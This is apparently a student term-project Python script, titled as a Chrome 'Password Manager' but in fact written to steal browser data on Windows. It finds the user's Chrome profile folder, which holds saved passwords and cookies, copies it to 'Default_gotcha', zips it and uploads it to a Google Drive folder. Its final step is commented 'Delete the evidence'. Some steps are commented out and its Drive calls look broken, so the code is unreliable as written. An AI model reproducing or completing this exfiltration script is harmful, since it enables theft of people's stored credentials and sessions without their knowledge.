#Grant Loewer - KSU - CIS655 FALL2020 - Term Project
#Google Chrome Password Manager
#Windows 10

#Import packages
import getpass
import shutil, os
import pydrive
from pydrive.auth import GoogleAuth 
from pydrive.drive import GoogleDrive 

#Copy directory recursively
def copyDirectory(src, dest):
    try:
        shutil.copytree(src, dest)
    # Directories are the same
    except shutil.Error as e:
        print('Directory not copied. Error: %s' % e)
    # Any error saying that the directory doesn't exist
    except OSError as e:
        print('Directory not copied. Error: %s' % e)

#Locate User Data folder
user_folder = getpass.getuser()
user_data_folder = 'C:/Users/{}/AppData/Local/Google/Chrome/User Data/Default'.format(user_folder)

#Copy the user data folder
copied_user_data_folder = 'C:/Users/{}/AppData/Local/Google/Chrome/User Data/Default_gotcha'.format(user_folder)
#copyDirectory(user_data_folder, copied_user_data_folder)

#Zip it
output_data_folder_name = 'C:/Users/{}/AppData/Local/Google/Chrome/User Data/{}_Default.zip'.format(user_folder, user_folder)
#shutil.make_archive(output_data_folder_name, 'zip', copied_user_data_folder)
    
#Send to a specified Google Drive
gauth = GoogleAuth()
gauth.LocalWebserverAuth()

drive = GoogleDrive(gauth)

#From:
folder = drive.CreateFolder()
folder.SetContentFolder(output_data_folder_name)
folder.Upload()

#To:
folder_name = "Public_Upload"

#Delete the evidence
os.rmdir(copied_user_data_folder)
#os.rmdir(output_data_folder_name)
